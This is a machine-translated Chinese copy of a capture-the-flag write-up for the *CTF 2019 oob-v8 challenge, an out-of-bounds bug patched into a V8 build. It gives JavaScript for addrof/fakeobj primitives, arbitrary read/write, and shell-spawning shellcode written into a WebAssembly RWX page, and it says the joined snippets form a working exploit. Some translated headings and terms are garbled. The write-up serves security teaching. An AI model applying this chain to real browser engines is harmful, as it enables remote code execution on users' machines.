# 小说要点:利用堆溢出 Bug *CTF 2019 oob-v8

> 原文：<https://infosecwriteups.com/novel-points-exploit-the-heap-overflow-bug-ctf-2019-oob-v8-97530977e5bd?source=collection_archive---------3----------------------->

![](img/d1ce15a88229eed9f335c527ad99f26d.png)

# 1.内容

*   许多堆溢出漏洞可以用类似的方式被利用
*   [V8 堆溢出漏洞的 PoC——* CTF 2019 oo b-V8](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#poc)
*   [剥削理念](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#exploitation-idea)
*   [V8 堆溢出漏洞的实际利用步骤](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#actual-exploitation-steps)
*   [V8 环境设置](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#environment)
*   [辅助类型转换功能](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#type-conversion-functions)
*   [在内存中准备对象](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#prepare-objects)
*   [泄露地址和伪造对象](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#leak-addresses-fake-objects)
*   [任意读写](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#arbitrary-reads-writes)
*   [RWX 页面和外壳代码注入](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#shellcode-injection)
*   [总结](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#summary)

# 2.许多堆溢出漏洞可以以类似的方式被利用

I have introduced a v8 heap overflow bug before: [V8 Array Overflow Exploitation: 2019 KCTF Problem 5 小虎还乡 — Pwn By Kenny](https://pwnbykenny.com/2020/08/01/v8-array-overflow-exploitation-2019-kctf-problem-5-%e5%b0%8f%e8%99%8e%e8%bf%98%e4%b9%a1/). This is another one: *CTF 2019 oob-v8\. The interesting things I’m going to show you in this post are: 1) This bug only allows you to read or overwrite specific 8 bytes. But you can use it to achieve arbitrary reads and writes. 2) This is a different heap overflow bug. But you can exploit it in a very similar way to the 2019 KCTF Problem 5\. In fact, many heap overflow bugs can all be exploited in such a similar way. To show you this, I will use the same headings as the 2019 KCTF Problem 5 post. Feel free to compare the two posts!

# 3.V8 堆溢出漏洞的概念验证— *CTF 2019 oob-v8

PoC 代码是触发 bug 的原因。对于这个*CTF 2019 oob-v8 的 bug，我们可以用“JSArray.oob()”进行越界读取，并用“js array . OOB(value)；”写出越界。JSArray 是一个 v8 对象，用来表示一个数组。例如，如果您编写类似“var arr =[1.1]；”的代码，内存中就会有一个 JSArray 对象。和" arr . OOB()；"允许您读取数组元素区域之外的下 8 个字节。" arr . OOB(2.2)；"允许您用 2.2 来覆盖 8 个字节。关于 JSArray 的更多信息，请访问 [V8 对象和它们的结构—肯尼的 Pwn](https://pwnbykenny.com/2020/07/05/v8-objects-and-their-structures/#jsarray-related-objects)

# 4.开发理念

这里有一个关于我们将如何利用 v8 堆溢出漏洞*CTF 2019 oob-v8 的总结。

*   首先，我们定义两个变量“var obj _ arr =[{ " a ":1 }]；”和“var double _ arr =[1.1]；”。第一个是对象数组。它存储对象的地址。第二个是双数组。它存储双精度值。{“a”:1 }和 1.1 不重要。它们只是用来创建特定类型的数组——对象数组和双数组。所以这两个值是可以改变的。
*   其次，我们实现两个函数:GetAddrOf(对象)，FakeObjFrom(地址)。GetAddrOf 返回对象的地址。FakeObjFrom 从一个地址返回一个对象。这两个函数的实现依赖于改变 obj_arr 和 double_arr 的类型字段。
*   第三，我们用上面两个函数实现另外两个函数:Read64(地址)，Write64(地址，值)。Read64 从地址中读取一个 8 字节的值。Write64 将一个 8 字节的值写入一个地址。它们的实现依赖于一个伪双精度数组— fake_double_arr。通过修改数组的“指向元素的指针”字段，我们能够读取和写入任意地址。
*   第四，我们使用 wasm 代码创建一个函数— f. V8 将代码放入一个 RWX 页面。然后，我们泄漏页面中的一个地址，并向该地址注入外壳代码。
*   最后，我们通过调用函数来执行 shell 代码:f()；。这是因为外壳代码覆盖了 f 的原始代码，外壳代码将产生一个外壳。

# 5.V8 堆溢出漏洞的实际利用步骤

以下开发步骤大量使用了关于 v8 对象结构的知识。请先阅读这个帖子来熟悉它们: [V8 对象及其结构——肯尼的 Pwn](https://pwnbykenny.com/2020/07/05/v8-objects-and-their-structures/)

# 5.1 V8 环境设置

首先从[这里](https://drive.google.com/file/d/1N8ZRtovEmhUCzyVSPYukEl6wgfj2kzWC/view?usp=sharing)下载 oob.diff。二、阅读本节，构建易受攻击的 v8: [V8 架构&肯尼](https://pwnbykenny.com/2020/06/30/v8-architectures-and-build-v8/#installation)构建 V8 — Pwn 其中，在命令 5 处，[commit-hash-number]为 6 DC 88 c 191 f 5 ECC 5389 DC 26 EFA 3c a 0907 faef 3598。在命令 8 之前，运行:git apply < oob.diff，记得把 oob.diff 放到文件夹“v8”里。

# 5.2 辅助类型转换功能

They are exactly the same as 2019 KCTF Problem 5: [V8 Array Overflow Exploitation: 2019 KCTF Problem 5 小虎还乡 — Pwn By Kenny](https://pwnbykenny.com/2020/08/01/v8-array-overflow-exploitation-2019-kctf-problem-5-%e5%b0%8f%e8%99%8e%e8%bf%98%e4%b9%a1/#auxiliary-type-conversion-functions)

# 5.3 在内存中准备对象

这对应于开发理念部分的第一步。我们需要一个对象数组和一个双数组。第二步我们还需要他们的类型字段的值。

```
var obj = {"a":1};
/* Define an object array. */
var obj_arr = [obj];
/* Define a double array. */
var double_arr = [1.1];
/* Get the object array's type field. */
var obj_arr_type = obj_arr.oob();
/* Get the double array's type field. */
var double_arr_type = double_arr.oob();
```

如果你读过关于 obejcts 结构的帖子。你会知道 obj_arr 在内存中是这样表示的:

```
+0x00: (FixedArray Begins) (Element Area Begins)
+0x08: (Length)
+0x10: (Pointer to {"a":1}) (First and also Last Element in the Element Area)
+0x18: (JSArray Begins) (Type of obj_arr)
+0x20: (...)
```

obj_arr.oob()读取其元素区域之外的下 8 个字节。所以它读取偏移量+0x18 处的值，这是 obj_arr 的类型值。这类似于 double_arr。

# 5.4 泄露地址和伪造对象

此部分对应于开发理念部分中的步骤 2。

```
function GetAddrOf(object) {
    /* Put the object into obj_arr. */
    obj_arr[0] = object;
    /* Overwrite obj_arr's type to double. */
    obj_arr.oob(double_arr_type);
    /* Get the object's address in double format. */
    let addr = obj_arr[0];
    /* Recover the type of obj_arr. */
    obj_arr.oob(obj_arr_type);
    return addr;
}
function FakeObjFrom(address) {
    double_arr[0] = address;
    /* Change the type of double_arr to object array. */
    double_arr.oob(obj_arr_type);
    /* Read the address in object pointer format. */
    let obj = double_arr[0];
    double_arr.oob(double_arr_type);
    return obj;
}
```

这两个函数的关键思想是类型字段控制第一个元素单元格中的内容。如果类型是 double，则单元格存储一个 double 数。如果类型是 object，那么单元格存储一个对象指针。如果它是一个对象指针，我们不能得到指针值。我们能得到的是对象本身而不是指针值。这就是为什么我们需要将类型改为 double。这类似于 FakeObjFrom。

# 5.5 任意读取和写入

```
A:var fake_double_arr_container = [
    double_arr_type, // Type Field
    double_arr_type, // Placeholder, Not Important
    double_arr_type, // Element Area Pointer, To Be Changed
    i2f(0x10, 0),    // Element Area's Length
];
B:var container_addr = GetAddrOf(fake_double_arr_container);
C:var fake_double_arr_addr = iadd(container_addr, ?); 
D:var fake_double_arr = FakeObjFrom(fake_double_arr_addr);
E:function Read64(address) {
    fake_double_arr_container[2] = iadd(address, -0x10);
    return fake_double_arr[0];
}
F:function Write64(address, value) {
    fake_double_arr_container[2] = iadd(address, -0x10);
    fake_double_arr[0] = value;
}
```

在 A 行，我们将一个双精度数组定义为一个容器。该容器包含一个伪双数组——fake _ double _ arr，它是根据双数组的结构构造的。我们能够将 fake_double_arr 的元素区域指针更改为任何地址。这就是我们实现任意读写的方式。这也是我们不直接定义 double 数组的原因。直接定义不允许我们改变它的元素区域指针。

在 B 行，我们得到了容器的地址。在 C 行，我们通过向 container_addr 添加一个偏移量来计算 fake_double_arr 的地址。你需要用真实的偏移量来代替问号。它可能会在您的机器上发生变化。对我来说，是 0x30。可以用 v8 原生函数查出来:%DebugPrint，%SystemBreak。在 D 行，我们最终让地址被识别为一个对象指针。所以我们有了我们的假双数组。

在 E 行，我们定义了一个 Read64 函数。首先，我们将它的元素区域指针设置为我们感兴趣的地址。第二，我们读取并返回它的值。元件区域具有结构。0x10 是结构的标头大小。Write64 类似。

# 5.6 RWX 页面和外壳代码注入

```
1   var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,
    128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,
    1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,
    128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,
    0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
2   var wasmModule = new WebAssembly.Module(wasmCode);
3   var wasmInstance = new WebAssembly.Instance(wasmModule, {});
4   var f = wasmInstance.exports.main;
5   var wasm_instance_addr = GetAddrOf(wasmInstance);
6   var rwx_page_addr = Read64(iadd(wasm_instance_addr, ?));
7   var shellcode = [
        i2f(0x2fbb4852, 0x99583b6a),
        i2f(0x5368732f, 0x6e69622f),
        i2f(0x050f5e54, 0x57525f54)
    ];
8   var data_buf = new ArrayBuffer(24);
9   var data_view = new DataView(data_buf);
10  var buf_backing_store_addr = iadd(GetAddrOf(data_buf), 0x20);
11  Write64(buf_backing_store_addr, rwx_page_addr);
12  data_view.setFloat64(0, shellcode[0], true);
13  data_view.setFloat64(8, shellcode[1], true);
14  data_view.setFloat64(16, shellcode[2], true);
15  f();
```

最后，我们到了外壳代码注入部分。我们想注入一个 RWX 页面。所以我们需要先创建这样一个页面。幸运的是，Wasm 代码就存储在这样的页面上。第 1 行到第 4 行使用 Wasm 代码来定义函数 f。第 5 行和第 6 行跟踪 wasmInstance 的结构并检索 Wasm 代码的地址。该地址距 wasmInstance 对象的开头有一定的偏移量。在您的机器上，偏移量可能会改变。记住用真实的偏移量替换问号。可以用 v8 原生函数查出来:%DebugPrint，%SystemBreak。对我来说，偏移量是 0x88。

第 7 行定义了外壳代码。我写了一篇关于外壳代码的文章。有关 shellcode 的更多信息，请在主页上搜索它。第 8、10、11 行覆盖了 data_buf 的后备存储指针。后备存储是 ArrayBuffer 对象存储其值的缓冲区。0x20 是 ArrayBuffer 对象结构内后备存储指针的偏移量。第 10 行用 RWX 页面的地址替换后备存储器指针。第 9、12、13、14 行将外壳代码写入后备存储器，即 RWX 页，Wasm 代码存储的地址。现在函数 f 的代码被覆盖为外壳代码。所以我们能够通过调用 f()来执行外壳代码；。

# 6.摘要

这篇文章描述了利用一个一个的错误*CTF 2019 oob-v8，只给你这么有限的能力。但是有趣的一点是，你可以通过 bug 实现更强大的原语。此外，我还想向您展示，许多堆溢出错误都可以通过类似的方式被利用。如果你对比一下这个帖子和“2019 KCTF 问题 5”的帖子，你会发现他们的剥削过程是相似的。

如果您连接第 5 部分中的代码片段，您将有一个工作漏洞。但是，请用它们的实际价值替换这两个问号。做一些实验/练习！

如果你喜欢我的帖子或者觉得有帮助，请帮我分享到你的社交媒体上~谢谢！

(本帖来自[小说要点:利用堆溢出 Bug *CTF 2019 oob-v8 — Pwn 作者肯尼](https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/))